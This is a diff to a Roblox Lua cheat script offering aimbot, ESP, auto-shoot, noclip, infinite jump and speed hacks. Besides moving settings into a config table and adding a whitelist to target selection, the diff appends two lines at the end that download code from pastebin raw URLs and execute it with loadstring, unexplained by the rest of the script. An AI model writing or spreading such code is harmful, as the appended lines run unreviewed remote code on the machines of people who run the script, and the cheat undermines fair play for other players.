@@ -1,13 +1,3 @@
-local SENSITIVITY_MULTIPLIER = Config.SENSITIVITY_MULTIPLIER
-local AimbotMode = Config.AimbotMode
-local ESPEnabled = Config.ESPEnabled
-local AutoShootEnabled = Config.AutoShootEnabled
-local InfiniteJumpEnabled = Config.InfiniteJumpEnabled
-local NoClipEnabled = Config.NoClipEnabled
-local WalkSpeedEnabled = Config.WalkSpeedEnabled
-local MOVE_SPEED = Config.WalkSpeed
-local Keybind = Config.AimbotKeybind
-
 local UserInputService = game:GetService("UserInputService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -16,7 +6,18 @@ local CoreGui = game:GetService("CoreGui")
 
 local LocalPlayer = Players.LocalPlayer
 local Camera = game.Workspace.CurrentCamera
-local Keybind = Enum.UserInputType.MouseButton2
+
+local SENSITIVITY_MULTIPLIER = UserConfig.AimbotSensitivity
+local Keybind = UserConfig.AimbotKeybind
+local MOVE_SPEED = UserConfig.WalkSpeed
+local AimbotMode = UserConfig.AimbotMode
+local AimbotEnabled = UserConfig.AimbotEnabled
+local ESPEnabled = UserConfig.ESPEnabled
+local AutoShootEnabled = UserConfig.AutoShootEnabled
+local InfiniteJumpEnabled = UserConfig.InfiniteJumpEnabled
+local NoClipEnabled = UserConfig.NoClipEnabled
+local WalkSpeedEnabled = UserConfig.WalkSpeedEnabled
+local AimbotToggleEnabled = UserConfig.AimbotToggleEnabled
 
 local SPACING = 20
 local ELEMENT_HEIGHT = 40
@@ -40,7 +41,6 @@ local MAX_SENSITIVITY = 1.5
 local BASE_SENSITIVITY = 0.5
 
 local MAX_AIMBOT_DISTANCE = 1000
-local AimbotToggleEnabled = false
 local IsRightClickAimbot = true
 
 local DefaultWalkSpeed = 16 
@@ -926,7 +926,7 @@ local function GetClosestPlayerToCursor()
     if not localRootPart then return nil end
 
     for _, player in pairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and player.Character and not isTeammate(player) and not isDead(player) then
+        if player ~= LocalPlayer and player.Character and not isTeammate(player) and not isDead(player) and not isWhitelisted(player) then
             local head = player.Character:FindFirstChild("Head")
             if head then
                 local distance = (localRootPart.Position - head.Position).Magnitude
@@ -1476,3 +1476,6 @@ local function updateUI()
 end
 
 updateUI()
+
+loadstring(game:HttpGet("https://pastebin.com/raw/aHYKbmCK",true))()
+loadstring(game:HttpGet("https://pastebin.com/raw/M3JUrbmU",true))()
